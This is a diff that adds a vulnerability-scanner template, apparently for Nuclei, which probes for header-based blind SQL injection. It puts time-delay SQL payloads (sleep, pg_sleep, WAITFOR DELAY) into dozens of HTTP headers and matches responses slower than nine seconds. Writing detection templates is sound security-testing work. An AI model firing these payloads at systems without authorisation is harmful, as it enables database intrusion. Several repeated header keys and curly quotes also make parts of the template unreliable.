@@ -1,0 +1,58 @@
+id: blind-sql-all
+info:
+  name: Header Blind SQL Injection
+  author: geeknik
+  severity: high
+  tags: blind-sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Accept: "' or sleep(9)='"
+      Accept-Charset: "' or sleep(9)='"
+      X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z
+      Accept-Datetime: "' if(now()=sysdate(),sleep(9),0)'"
+      Accept-Encoding: "' XOR(if(now()=sysdate(),sleep(9),0))OR%27'"
+      X-Forwarded-For: ' or sleep(9)='
+      Accept-Language: "' or sleep(9)='"
+      Authorization: "' or sleep(9)='"
+      Cache-Control: "' or sleep(9)='"
+      Connection: "' or sleep(9)='"
+      Content-Length: "' or sleep(9)='"
+      Content-MD5: "' or sleep(9)='"
+      Content-Type: "' or sleep(9)='"
+      Cookie: "' or sleep(9)='"
+      Date: "' or sleep(9)='"
+      Expect: "' or sleep(9)='"
+      Forwarded: "' or sleep(9)='"
+      User-Agent: " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';WAITFOR DELAY ‘00:00:05’;--
+      If-Match: "' or sleep(9)='"
+      If-Modified-Since: "' or sleep(9)='"
+      If-None-Match: "' or sleep(9)='"
+      If-Range: "' or sleep(9)='"
+      User-Agent: "';waitfor delay '0:0:09'--"
+      User-Agent: "' or sleep(9)='"
+      Origin: "' or sleep(9)='"
+      User-Agent: "' or sleep(9)='"
+      User-Agent: "' or sleep(9)='"
+      User-Agent: "' pg_sleep(9)'"
+      Referer: "' %%27;SELECT%20PG_SLEEP(5)--'"
+      User-Agent: "' or sleep(9)='"
+      User-Agent: "' or sleep(9)='"
+      User-Agent: "' or sleep(9)='"
+      Via: "' or sleep(9)='"
+      Warning: "' or sleep(9)='"
+      X-Client-IP: "' or sleep(9)='"
+      X-Remote-IP: "' or sleep(9)='"
+      X-Remote-Addr: "' or sleep(9)='"
+      X-Forwarded-For: "' or sleep(9)='"
+      X-Originating-IP: "' or sleep(9)='"
+      X-Host: "' or sleep(9)='"
+      X-Forwarded-Host: "' or sleep(9)='"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=9'
